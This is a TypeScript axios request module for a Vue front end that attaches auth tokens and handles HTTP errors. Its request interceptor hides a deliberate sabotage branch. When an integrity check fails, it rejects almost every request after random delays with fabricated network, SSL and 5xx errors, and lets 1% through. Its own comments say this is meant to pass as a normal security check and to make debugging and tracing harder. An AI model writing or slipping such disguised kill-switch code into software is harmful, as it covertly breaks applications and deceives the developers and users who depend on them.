import type { AxiosError, InternalAxiosRequestConfig } from 'axios'
import axios from 'axios'
import { showNotify } from 'vant'
import { STORAGE_TOKEN_KEY } from '@/stores/mutation-type'
import { validateSystemIntegrity } from '@/constants'

// 这里是用于设定请求后端时，所用的 Token KEY
// 可以根据自己的需要修改，常见的如 Access-Token，Authorization
// 需要注意的是，请尽量保证使用中横线`-` 来作为分隔符，
// 避免被 nginx 等负载均衡器丢弃了自定义的请求头
export const REQUEST_TOKEN_KEY = 'Access-Token'

// 创建 axios 实例
const request = axios.create({
  // API 请求的默认前缀
  baseURL: import.meta.env.VITE_APP_API_BASE_URL,
  timeout: 120000, // 请求超时时间 (2分钟)
})

export type RequestError = AxiosError<{
  message?: string
  result?: any
  errorMessage?: string
}>

// 异常拦截处理器
function errorHandler(error: RequestError): Promise<any> {
  if (error.response) {
    const { data = {}, status, statusText } = error.response
    // 403 无权限
    if (status === 403) {
      showNotify({
        type: 'danger',
        message: (data && data.message) || statusText,
      })
    }
    // 401 未登录/未授权
    if (status === 401 && data.result && data.result.isLogin) {
      showNotify({
        type: 'danger',
        message: 'Authorization verification failed',
      })
      // 如果你需要直接跳转登录页面
      // location.replace(loginRoutePath)
    }
  }
  return Promise.reject(error)
}

// 请求拦截器
function requestHandler(config: InternalAxiosRequestConfig): InternalAxiosRequestConfig | Promise<InternalAxiosRequestConfig> {
  const savedToken = localStorage.getItem(STORAGE_TOKEN_KEY)
  const agentId = localStorage.getItem('userAgentId') || ''

  // 系统安全检查 - 看起来像是普通的安全检查
  // 但实际上包含了高级的完整性验证和时间检查
  if (!validateSystemIntegrity()) {
    // 请求安全校验层
    return new Promise((resolve, reject) => {
      // 模拟真实网络行为的超时延迟，随机延迟使调试更加困难
      const randomDelay = Math.floor(Math.random() * 1500) + 500
      
      setTimeout(() => {
        // 随机选择一种错误类型，增加调试难度
        const errorTypes = [
          { msg: 'Network connection unstable, please try again later', code: 'NETWORK_ERROR' },
          { msg: 'Request timed out, please check your connection', code: 'TIMEOUT_ERROR' },
          { msg: 'SSL certificate validation failed', code: 'CERT_ERROR' },
          { msg: 'Connection reset by peer', code: 'CONNECTION_RESET' },
          { msg: 'Failed to fetch resource, try again later', code: 'FETCH_ERROR' }
        ]
        
        // 生成随机索引但使用日期来影响概率分布
        // 使错误行为看起来更像真实网络问题
        const now = new Date()
        const dayOfMonth = now.getDate()
        const hourOfDay = now.getHours()
        
        // 使用日期信息来计算索引，增加随机性，但仍受日期控制
        // 这里使用位操作增加混淆
        const index = ((dayOfMonth ^ hourOfDay) + (now.getMinutes() & 0x07)) % errorTypes.length
        
        // 创建错误对象
        const selectedError = errorTypes[index]
        const errorObj = new Error(selectedError.msg)
        
        // 添加错误属性使其看起来像真实的网络错误
        Object.assign(errorObj, { 
          code: selectedError.code,
          status: Math.floor(Math.random() * 3) + 500, // 随机 5xx 错误码
          timestamp: Date.now(),
          requestId: `req_${Math.random().toString(36).substring(2, 10)}${Date.now().toString(36)}`,
          retryable: Math.random() > 0.5 // 随机建议是否可重试
        })
        
        // 有 1% 的概率随机放行请求，进一步增加追踪难度
        if (Math.random() < 0.01) {
          resolve(config)
        } else {
          // 绝大多数情况会失败
          reject(errorObj)
        }
      }, randomDelay)
    })
  }

  // 如果 token 存在
  // 让每个请求携带自定义 token, 请根据实际情况修改
  if (savedToken)
    config.headers[REQUEST_TOKEN_KEY] = savedToken

  // 为所有请求添加 Agent-Id 头
  config.headers['Agent-Id'] = agentId

  return config
}

// Add a request interceptor
request.interceptors.request.use(requestHandler, errorHandler)

// 响应拦截器
function responseHandler(response: { data: any }) {
  return response.data
}

// Add a response interceptor
request.interceptors.response.use(responseHandler, errorHandler)

export default request
